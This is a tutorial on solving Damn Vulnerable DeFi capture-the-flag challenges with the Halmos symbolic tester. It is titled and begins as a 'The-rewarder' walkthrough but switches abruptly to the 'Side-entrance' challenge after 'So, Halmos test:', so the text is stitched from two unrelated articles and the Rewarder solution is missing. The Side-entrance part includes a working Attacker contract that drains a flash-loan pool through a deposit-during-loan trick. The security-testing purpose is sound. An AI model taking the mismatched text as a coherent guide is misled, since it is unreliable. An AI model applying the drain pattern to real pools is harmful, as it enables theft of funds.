# Halmos vs The-rewarder
## Halmos version
halmos 0.2.2.dev1+gd4cac2e was used in this article
## Foreword
It is strongly assumed that the reader is familiar with the previous articles on solving 
1. ["Unstoppable"](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/unstoppable) 
2. ["Truster"](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/truster)
3. ["Naive-receiver"](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/naive-receiver)
4. ["Side-entrance"](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/side-entrance)

since the main ideas here are largely repeated and we will not dwell on them again.

Also, let's clearly talk that despite the same name, the "The-rewarder" challenge in v4 has completely new conditions and bug mechanics compared to v3. Therefore, it is highly recommended to familiarize yourself with the new "The-rewarder" and the common solution to this problem. We will focus specifically on the use of Halmos, but not on the description of the challenge.
## Preparation
### Common prerequisites
1. Copy **TheRewarder.t.sol** file to **TheRewarderHalmos.t.sol**.
2. Rename **“test_theRewarder()”** to **"check_theRewarder()"**, so Halmos will execute this test symbolically.
3. Avoid using **makeAddr()** cheatcode. Due to the specifics of the task, hard-coded addresses will look unusual. This time, we will take the player's and Alice's addresses directly from weth-distribution.json, because the very logic of the task is tied to these addresses:
    ```solidity
    address deployer = address(0xcafe0000);
    address recovery = address(0xcafe0002);
    address alice = address(0x328809Bc894f92807417D2dAD6b7C998c1aFdac6);
    address player = address(0x44E97aF4418b7a17AABD8090bEA0A471a366305C);
    ```
4. Create **GlobalStorage** contract and save address-name pairs of contracts:
    ```solidity
    import "lib/GlobalStorage.sol";
    ...
    GlobalStorage glob;
    ...
    function setUp() public {
        ...
        glob = new GlobalStorage();
        ...
        glob.add_addr_name_pair(address(dvt), "DamnValuableToken");
        glob.add_addr_name_pair(address(weth), "WETH");
        glob.add_addr_name_pair(address(distributor), "TheRewarderDistributor");
    }
    ```
    we ignore the "merkle" contract, since it is completely readonly.
5. Bypass issue #338
    ```solidity
    startHoax(deployer, 1 << 80);
    ```
6. Print all contract addresses, including the upcoming **SymbolicAttacker**:
    ```solidity
    SymbolicAttacker attacker = new SymbolicAttacker();
    console.log("GlobalStorage", address(glob));
    console.log("DamnValuableToken", address(dvt));
    console.log("WETH", address(weth));
    console.log("TheRewarderDistributor", address(distributor));
    console.log("SymbolicAttacker", address(attacker));
    ```
### _isSolved() implementation
The original checks look like:
```solidity
// Player saved as much funds as possible, perhaps leaving some dust
        assertLt(dvt.balanceOf(address(distributor)), 1e16, "Too much DVT in distributor");
        assertLt(weth.balanceOf(address(distributor)), 1e15, "Too much WETH in distributor");

        // All funds sent to the designated recovery account
        assertEq(
            dvt.balanceOf(recovery),
            TOTAL_DVT_DISTRIBUTION_AMOUNT - ALICE_DVT_CLAIM_AMOUNT - dvt.balanceOf(address(distributor)),
            "Not enough DVT in recovery account"
        );
        assertEq(
            weth.balanceOf(recovery),
            TOTAL_WETH_DISTRIBUTION_AMOUNT - ALICE_WETH_CLAIM_AMOUNT - weth.balanceOf(address(distributor)),
            "Not enough WETH in recovery account"
        );
```
As usual, we check whether we can empty the distributor of some unexpected amount. Note that the formula here will be a bit more complicated than we are used to seeing. First, we take into account that Alice has taken her reward and it is expected that the player himself can take his reward once. Therefore, the invariant looks like this:
```solidity
function _isSolved() private view {
    assert (dvt.balanceOf(address(distributor)) >= 
            TOTAL_DVT_DISTRIBUTION_AMOUNT - ALICE_DVT_CLAIM_AMOUNT - 11524763827831882);
    assert (weth.balanceOf(address(distributor)) >= 
            TOTAL_WETH_DISTRIBUTION_AMOUNT - ALICE_WETH_CLAIM_AMOUNT - 1171088749244340);
}
```
11524763827831882 and 1171088749244340 are the amounts of DVT and WETH the player is expected to be able to collect as he is one of the reward recipients. We took these numbers from dvt-distribution.json and weth-distribution.json.
### Loading rewards
In the setup process, the original test internally parses 1000 records in JSON format and uploads them to the distrubutor contract. However, there is a problem: Halmos does not support the required cheat codes, namely vm.projectRoot(), vm.readFile() and vm.parseJson(). We will work around this problem in a somewhat dirty but effective way. Instead of parsing the JSON, we will immediately explicitly insert the bytes into the right place. First, let's log the necessary bytes from the original TheRewarder.t.sol:
```solidity
function _loadRewards(string memory path) private view returns (bytes32[] memory leaves) {
    console.logBytes(vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), path))));
    ...
```
```javascript
$ forge test --mp test/the-rewarder/TheRewarder.t.sol -vvv
...
Logs:
  0x000...e962
  0x000...b3d4
```
Insert it into the Halmos test:
```solidity
function setUp() public {
    ...
    bytes32[] memory dvtLeaves = _loadRewardsDVT();
    bytes32[] memory wethLeaves = _loadRewardsWETH();
    ...
}
...
function _loadRewardsDVT() private view returns (bytes32[] memory leaves) {
    Reward[] memory rewards =
        abi.decode(hex"000...e962", (Reward[]));
    assertEq(rewards.length, BENEFICIARIES_AMOUNT);

    leaves = new bytes32[](BENEFICIARIES_AMOUNT);
    for (uint256 i = 0; i < BENEFICIARIES_AMOUNT; i++) {
        leaves[i] = keccak256(abi.encodePacked(rewards[i].beneficiary, rewards[i].amount));
    }
}
    
    
function _loadRewardsWETH() private view returns (bytes32[] memory leaves) {
    Reward[] memory rewards =
        abi.decode(hex"000...b3d4", (Reward[]));
    assertEq(rewards.length, BENEFICIARIES_AMOUNT);

    leaves = new bytes32[](BENEFICIARIES_AMOUNT);
    for (uint256 i = 0; i < BENEFICIARIES_AMOUNT; i++) {
        leaves[i] = keccak256(abi.encodePacked(rewards[i].beneficiary, rewards[i].amount));
    }
}
```
This thing works for a long time in Halmos: it took all of 2 minutes on my machine to create dvt and weth leaves.
### dealing with merkle.getRoot()
Again cryptography puts a spanner in our works. This time when we try to run the test we get an error:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_theRewarder
...
Error: setUp() failed: HalmosException: No successful path found in setUp()
```
The problem is in merkle.getRoot():
```solidity
function getRoot(bytes32[] memory data) public pure virtual returns (bytes32) {
    require(data.length > 1, "won't generate root for single leaf");
    while (data.length > 1) {
        data = hashLevel(data);
    }
    return data[0];
}
```
Halmos doesn't do well with large loops. The good news is that we don't have to look for root in the runtime. It is enough to calculate it once, even in the original forge test and hardcode it:
```solidity
merkle = new Merkle();
console.logBytes32(merkle.getRoot(dvtLeaves));
console.logBytes32(merkle.getRoot(wethLeaves));
...
```
And this is what we got:
```javascript
$ forge test --mp test/the-rewarder/TheRewarder.t.sol -vvv
...
Logs:
    0x399df90cbebfb0e630b6da99a45325404a758823effc616197f3c33f749cb5d4
    0x5a1b4e345b2e4419e385fa460b91decd0d9d34cac0bd187aedea5484d2cdd6f6
    ...
```
So, Halmos test:

## Improvement of coverage
According to the familiar principle, we start with single symbolic transaction. Let's see if all the code is covered:
```solidity
function check_sideEntrance() public checkSolvedByPlayer {
    ...
    attacker.attack();
}
```
```solidity
contract SymbolicAttacker is Test, SymTest {
    ...
    function attack() public {
        execute_tx();
    }
```
### Callbacks
Run:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_sideEntrance -vvvvv
...
Path #4:
            ...
            CALL SideEntranceLenderPool::flashLoan(p_amount_uint256_a507985_05()) (value: halmos_ETH_val_uint256_4f72fbf_01)
                CALL SymbolicAttacker::execute() (value: p_amount_uint256_a507985_05)
                ↩ REVERT 0x (error: Revert())
                ...
...
[PASS] check_sideEntrance() (paths: 9, time: 0.26s, bounds: [])
```
There is a problem here: **SideEntranceLenderPool::flashLoan()** assumes that the contract that called this function has a payable callback "**execute()**", which our **SymbolicAttacker** does not have. 
```solidity
contract SideEntranceLenderPool {
    ...
    function flashLoan(uint256 amount) external {
        ...
        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
    ...
    }
```
We implement a valid execute:
```solidity
function execute () external payable {
    uint256 ETH_val = svm.createUint256("ETH_val_execute");
    address target = svm.createAddress("target_execute");
    bytes memory data;
    //Get some concrete target-name pair
    (target, data) = glob.get_concrete_from_symbolic(target);
    target.call{value: ETH_val}(data);
}
```
And one more problem in **SideEntranceLenderPool::withdraw()**.
Despite the fact that **SymbolicAttacker** had no pool balance at the time of the transaction, Halmos still attempted to transfer some symbolic amount of **ETH** to **SymbolicAttacker**. And this is what happened:
```javascript
Path #2:
...
           CALL SideEntranceLenderPool::withdraw() (value: halmos_ETH_val_uint256_4f72fbf_01)
           ...
                CALL SymbolicAttacker::0x
                ↩ REVERT 0x (error: Revert())
                ...
```
We don't have the **receive()** callback function, so we implement it as well:
```solidity
receive() external payable {
    uint256 ETH_val = svm.createUint256("ETH_val_receive");
    address target = svm.createAddress("target_receive");
    bytes memory data;
    //Get some concrete target-name pair
    (target, data) = glob.get_concrete_from_symbolic(target);
    target.call{value: ETH_val}(data);
}
```
### Preventing recursion
Now let's talk about possible recursion. This time, since we have 2 callback functions in **SymbolicAttacker** that behave like **execute_tx()**, we won't be able to conveniently use the **vm.assume(...)** pattern. At the same time, the standard [ReentrancyGuard](https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard) will not work for us, as it is common to all functions, which can cut off some scenarios.
So, let's make our simplest analogue of **ReentrancyGuard**:
```solidity
contract SymbolicAttacker is Test, SymTest {
...
    bool receive_reent_guard = false;
    bool execute_reent_guard = false;
    ...
    receive() external payable {
        if (receive_reent_guard) {
            revert();
        }
        receive_reent_guard = true;
        ...
        receive_reent_guard = false;
    }
    
    function execute () external payable {
        if (execute_reent_guard) {
            revert();
        }
        execute_reent_guard = true;
        ...
        execute_reent_guard = false;
    }
```
Run again:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_sideEntrance
...
[PASS] check_sideEntrance() (paths: 57, time: 1.70s, bounds: [])
...
```
Perfectly. The number of completed paths has increased. Well, you can already guess what will happen next :)
## Increasing transactions
Add another symbolic attacking transaction:
```solidity
function attack() public {
    execute_tx();
    execute_tx();
}
```
Run:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_sideEntrance
...
Counterexample:
halmos_ETH_val_execute_uint256_c9b0694_07 = 0x000000000000000000000000000000000000000000000016bc1f3a7c229fd8e9
halmos_ETH_val_receive_uint256_4d032b7_19 = 0x000000000000000000000000000000000000000000000016c7c8b6b3a7640000
halmos_ETH_val_uint256_923f00f_01 = 0x0000000000000000000000000000000000000000000000000000000000000000
halmos_ETH_val_uint256_d146144_13 = 0x0000000000000000000000000000000000000000000000000000000000000000
halmos_selector_bytes4_2929a1b_18 = withdraw
halmos_selector_bytes4_321817f_06 = flashLoan
halmos_selector_bytes4_487ba75_12 = deposit
halmos_selector_bytes4_780a835_24 = 0x00000000
halmos_target_address_742d8e0_14 = 0x00000000000000000000000000000000aaaa0003
halmos_target_address_8fb3daf_02 = 0x00000000000000000000000000000000aaaa0003
halmos_target_execute_address_b2f1b7a_08 = 0x00000000000000000000000000000000aaaa0003
halmos_target_receive_address_d6b1aa3_20 = 0x00000000000000000000000000000000aaaa0003
p_amount_uint256_b5e253c_05 = 0x000000000000000000000000000000000000000000000016b9e8000000000000
[FAIL] check_sideEntrance() (paths: 3334, time: 102.26s, bounds: [])
```
Okay, that was pretty easy. Let's analyze a counterexample.
## Counterexamples analysis
The counterexample clearly shows the sequence of what happened. 
**SideEntranceLenderPool::flashLoan()** was called. pool called the **execute()** function from our **SymbolicAttacker**. He, in turn, using borrowed funds (and little amount of his own), put them on deposit in the same pool. **flashLoan** ended successfully, as the balance of the pool at the time of the end of flashLoan became even larger. After that, the **SymbolicAttacker** simply withdrew all the 
unfair funds from the  deposit with the **withdraw()** function in the second transaction. 

Let's also pay attention to what was done in the **receive()** callback:

```javascript
halmos_selector_bytes4_780a835_24 = 0x00000000
halmos_ETH_val_receive_uint256_4d032b7_19 = 0x000000000000000000000000000000000000000000000016c7c8b6b3a7640000
```
Selector **0x00000000** is an **ETH** transfer. That is, it is simply sending a certain amount of **Ether** back to the pool. Since this does not affect the attack in any way, this part of the counterexample can be ignored when building the attack.
## Using a counterexample
Now, with the bug, the attack becomes obvious:
```solidity
pragma solidity =0.8.25;

import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";

contract Attacker {
    uint256 constant ETHER_IN_POOL = 1000e18;
    SideEntranceLenderPool public pool;
    uint256 public amount;
    address public recovery;

    constructor (   SideEntranceLenderPool _pool, 
                    uint256 _amount, 
                    address _recovery) {
        pool = _pool;
        amount = _amount;
        recovery = _recovery;
    }

    receive() external payable {
    }

    function execute () external payable {
        pool.deposit(amount);
    }

    function attack(address recovery) public {
        pool.flashLoan(amount);
        pool.withdraw();
        SafeTransferLib.safeTransferETH(recovery, ETHER_IN_POOL);
    }
}
```
```solidity
function test_sideEntrance() public checkSolvedByPlayer {
    Attacker attacker = new Attacker(pool, 1000e18, recovery);
    attacker.attack();
}
```
Run:
```javascript
$ forge test --mp test/side-entrance/SideEntrance.t.sol
...
[PASS] test_sideEntrance() (gas: 295447)
```
Another Damn Vulnerable Defi challenge solved!
## Fuzzing vs Side-entrance
I found some solutions to this problem by fuzzing on the internet. First one is [this article](https://www.rareskills.io/post/invariant-testing-solidity) by **Team RareSkills**. But there is a problem with this solution: they used a **Handler** that was written in such a way that the **Foundry** fuzzer "knows" in advance what the bug is and how to exploit it. That is, they gave the fuzzer too big hint:
```solidity
import {SideEntranceLenderPool} from "../../src/SideEntranceLenderPool.sol";

import "forge-std/Test.sol";

contract Handler is Test {
    // the pool contract
    SideEntranceLenderPool pool;
    
    // used to check if the handler can withdraw ether after the exploit
    bool canWithdraw;

    constructor(SideEntranceLenderPool _pool) {
        pool = _pool;

        vm.deal(address(this), 10 ether);
    }
    
    // this function will be called by the pool during the flashloan
    function execute() external payable {
        pool.deposit{value: msg.value}(); // !!! This line is too explicit hint
        canWithdraw = true;
    }
    
    // used for withdrawing ether balance in the pool
    function withdraw() external {
        if (canWithdraw) pool.withdraw();
    }

    // call the flashloan function of the pool, with a fuzzed amount
    function flashLoan(uint amount) external {
        pool.flashLoan(amount);
    }

    receive() external payable {}
}
```
In my opinion, fuzzing through such a **Handler** is not enough to say that the **Foundry** is really capable of finding this kind of bugs.

Another solution is made by the **Crytic team** and can be found [at this link](https://github.com/crytic/building-secure-contracts/blob/master/program-analysis/echidna/exercises/exercise7/solution.sol). Here the situation is much better: the solution is abstract enough and gives space for **Echidna** itself to find a bug. Besides, it only took a few seconds to find the bug.

Let's compare how **Echidna** and **Halmos** solve the problem of "taking into account that any function can be executed inside **execute()**".

Echidna:
```solidity
...
function setEnableWithdraw(bool _enabled) public {
    enableWithdraw = _enabled;
}

function setEnableDeposit(bool _enabled, uint256 _amount) public {
    enableDeposit = _enabled;
    depositAmount = _amount;
}

function execute() external payable override {
    if (enableWithdraw) {
        pool.withdraw();
    }
    if (enableDeposit) {
        pool.deposit{value: depositAmount}();
    }
}
...
```
We explicitly indicate which functions can be called and with which parameters. Obviously, if there was a larger setup - this code would become much more "bloated". We already saw something like this in ["Truster"](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/truster#echidna).

Now Halmos:
```solidity
function execute () external payable {
    ...
    uint256 ETH_val = svm.createUint256("ETH_val_execute");
    address target = svm.createAddress("target_execute");
    bytes memory data;
    (target, data) = glob.get_concrete_from_symbolic(target);
    target.call{value: ETH_val}(data);
    ...
}
```
It is easy to see that the Halmos-based code provides a better abstraction for such cases and does a better job of expanding the setup.
## Conclusions
1. Using already accumulated techniques and principles, we solved the next Damn Vulnerable Defi challenge with Halmos quite easily. Every step was obvious and self-explanatory.
2. Adapting the test to a specific contract is a good idea. For example, in this challenge we adapted to use native **ETH**.
3. We confirm again the conclusions we made earlier: in the case of a small setup, fuzzing really seems to be a very effective tool, even if it is necessary to use some transaction abstraction. However, fuzzing engines do not have convenient abstraction mechanisms, so if target contracts are tied to some logic of abstract calls, Halmos looks much more convenient and powerful.